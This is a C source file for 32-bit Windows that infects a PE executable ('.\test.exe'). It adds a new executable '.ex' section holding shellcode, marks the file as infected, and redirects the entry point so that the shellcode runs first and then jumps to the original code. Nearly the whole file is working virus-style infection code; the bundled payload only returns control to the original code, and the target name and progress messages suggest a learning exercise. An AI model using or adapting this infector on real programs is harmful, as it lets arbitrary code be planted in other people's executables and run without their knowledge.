#include <Windows.h>
#include <winnt.h>
#include <winternl.h>
#include <minwindef.h>
#include <fileapi.h>
#include <handleapi.h>

#include <stdio.h>
#include <malloc.h>
#include <string.h>

inline void ReadOffset(HANDLE hFile, long offset, long mode, void* buf, long size) {
    if(SetFilePointer(hFile, offset, NULL, mode) == INVALID_SET_FILE_POINTER) {
        puts("Error when set file pointor!");
        exit(1);
    }
    if(ReadFile(hFile, buf, size, NULL, NULL) == FALSE) {
        puts("Error when read file!");
        exit(1);
    }
}

inline void WriteOffset(HANDLE hFile, long offset, long mode, void* buf, long size) {
    if(SetFilePointer(hFile, offset, NULL, mode) == INVALID_SET_FILE_POINTER) {
        puts("Error when set file pointor!");
        exit(1);
    }
    if(WriteFile(hFile, buf, size, NULL, NULL) == FALSE) {
        puts("Error when write file!");
        exit(1);
    }
}

inline void SetFileSize(HANDLE hFile, long size) {
    if(SetFilePointer(hFile, size, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER) {
        puts("Error when set file pointor!");
        exit(1);
    }
    if(SetEndOfFile(hFile) == FALSE) {
        puts("Error when modify size!");
        exit(1);
    }
}

#define BUF_SIZE (1 << 20)

const char *TARGET = ".\\test.exe";
char buf[BUF_SIZE];

#define JMP_POINT_OFFSET 0x1C
#define CODE_SIZE 0x26
BYTE shellCode[CODE_SIZE] = {0x55, 0x8b, 0xec, 0x83, 0xec, 0x8, 0x64, 0xa1, 0x30, 00, 00, 00, 0x89, 0x45, 0xfc, 0x8b, 0x45, 0xfc, 0x8b, 0x48, 0x8, 0x89, 0x4d, 0xf8, 0x8b, 0x45, 0xf8, 0x5, 0x44, 0x33, 0x22, 0x11, 0xff, 0xe0, 0x8b, 0xe5, 0x5d, 0xc3};

HANDLE OpenTarget() {
    HANDLE hFile = CreateFileA(
        TARGET, 
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if(hFile == NULL) {
        puts("Open target failed.");
        exit(1);
    }
    puts("Open target success!");
    return hFile;
}

IMAGE_DOS_HEADER dosHdr;
IMAGE_FILE_HEADER fileHdr;
IMAGE_OPTIONAL_HEADER32 optHdr;
IMAGE_SECTION_HEADER lasSecHdr, newSecHdr;

void InfectTarget(HANDLE hFile) {
    puts("Init Header Pointer...");
    PIMAGE_DOS_HEADER pDosHdr = &dosHdr;
    PIMAGE_FILE_HEADER pFileHdr = &fileHdr;
    PIMAGE_OPTIONAL_HEADER32 pOptHdr = &optHdr;
    PIMAGE_SECTION_HEADER pLasSecHdr = &lasSecHdr;
    PIMAGE_SECTION_HEADER pNewSecHdr = &newSecHdr;
//======================================================================
    puts("Get Headers and Check...");
    // Get DOS Header
    ReadOffset(
        hFile, 0, FILE_BEGIN, 
        (PVOID)&dosHdr, sizeof(IMAGE_DOS_HEADER)
    );
    // Check infected
    if(pDosHdr->e_res[0] == 0x1234) {
        puts("Error: Target has been infected!");
        exit(1);
    }
    // Check Signature
    DWORD pe00;
    ReadOffset(
        hFile, pDosHdr->e_lfanew, FILE_BEGIN,
        (PVOID)&pe00, sizeof(DWORD)
    );
    if(pe00 != 0x00004550) {
        puts("Error: Not a pe file!");
        exit(1);
    }
    // Get File Header
    ReadOffset(
        hFile, 0, FILE_CURRENT, 
        (PVOID)&fileHdr, sizeof(IMAGE_FILE_HEADER)
    );
    // Get Optional Header
    ReadOffset(
        hFile, 0, FILE_CURRENT, 
        (PVOID)&optHdr, 
        /* 224 when 32 bits, same as pFileHdr->SizeOfOptionalHeader */
        sizeof(IMAGE_OPTIONAL_HEADER32) 
    );
    if(pOptHdr->Magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC) {
        puts("Error: Not a 32 bits exe!");
        exit(1);
    }
    // Check Headers Space
    long currentSize = \
        pFileHdr->NumberOfSections * sizeof(IMAGE_SECTION_HEADER) \
        + pDosHdr->e_lfanew + 0x4 \
        + sizeof(IMAGE_FILE_HEADER) \
        + pFileHdr->SizeOfOptionalHeader;
    long alignSize = pOptHdr->SizeOfHeaders;
    if(currentSize + sizeof(IMAGE_SECTION_HEADER) > alignSize) {
        puts("Error: No space to insert a new sections!");
        exit(1);
    }
    // Get Last Section Header
    ReadOffset(
        hFile, currentSize - sizeof(IMAGE_SECTION_HEADER), FILE_BEGIN, 
        (PVOID)&lasSecHdr, sizeof(IMAGE_SECTION_HEADER)
    );
//======================================================================
    puts("Prepare to infect...");
    // Get align
    long fileAlign = pOptHdr->FileAlignment;
    long secAlign = pOptHdr->SectionAlignment; 
    // Set old entry VA
    long oldVA = pOptHdr->AddressOfEntryPoint;
    long *jmpPoint = (void *)(shellCode + JMP_POINT_OFFSET);
    *jmpPoint = oldVA;
    // Calc New Section raw
    long rawNewSec = pLasSecHdr->PointerToRawData + pLasSecHdr->SizeOfRawData;
    // Calc New Section rva 
    long lasVirSize = pLasSecHdr->Misc.VirtualSize;
    if(lasVirSize % secAlign != 0) lasVirSize = (lasVirSize / secAlign + 1) * secAlign;
    long rvaNewSec = pLasSecHdr->VirtualAddress + lasVirSize;
    // Calc New Section raw size
    long raw_size = CODE_SIZE;
    if(CODE_SIZE % fileAlign != 0) raw_size = (CODE_SIZE / fileAlign + 1) * fileAlign;
    // Calc New Section image size
    int vir_size = CODE_SIZE;
    if(CODE_SIZE % secAlign != 0) vir_size = (CODE_SIZE / secAlign + 1) * secAlign;
    // Set New Section Header
    char *sName = pNewSecHdr->Name;
    sName[0] = '.', sName[1] = 'e', sName[2] = 'x';
    pNewSecHdr->Misc.VirtualSize = CODE_SIZE;
    pNewSecHdr->VirtualAddress = rvaNewSec;
    pNewSecHdr->SizeOfRawData = raw_size;
    pNewSecHdr->PointerToRawData = rawNewSec;
    pNewSecHdr->PointerToRelocations = 0;
    pNewSecHdr->PointerToLinenumbers = 0;
    pNewSecHdr->NumberOfRelocations = 0;
    pNewSecHdr->NumberOfLinenumbers = 0;
    pNewSecHdr->Characteristics = \
        IMAGE_SCN_CNT_CODE | IMAGE_SCN_ALIGN_32BYTES | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ;
    // Set Infected tag
    pDosHdr->e_res[0] = 0x1234;
    // Fix File Header
    pFileHdr->NumberOfSections++;
    // Fix Optional Header
    pOptHdr->AddressOfEntryPoint = rvaNewSec;
    pOptHdr->SizeOfImage = rvaNewSec + vir_size;
//======================================================================
    puts("Infect the file...");
    // Saved Dos Header
    WriteOffset(
        hFile, 0, FILE_BEGIN,
        (PVOID)&dosHdr, sizeof(IMAGE_DOS_HEADER)
    );
    // Saved File Header
    WriteOffset(
        hFile, pDosHdr->e_lfanew + 0x4, FILE_BEGIN,
        (PVOID)&fileHdr, sizeof(IMAGE_FILE_HEADER)
    );
    // Saved Optional Header
    WriteOffset(
        hFile, 0, FILE_CURRENT,
        (PVOID)&optHdr,
        sizeof(IMAGE_OPTIONAL_HEADER32)
    );
    // Saved New Section Header
    WriteOffset(
        hFile, currentSize, FILE_BEGIN,
        (PVOID)&newSecHdr,
        sizeof(IMAGE_SECTION_HEADER)
    );
    // Saved New Section
    WriteOffset(
        hFile, rawNewSec, FILE_BEGIN,
        shellCode, CODE_SIZE
    );
    // Alignment
    SetFileSize(hFile, rawNewSec + raw_size);
//======================================================================
    puts("Infect success!");
}

int main() {
    HANDLE hf = OpenTarget();
    InfectTarget(hf);
    CloseHandle(hf);
    return 0;
}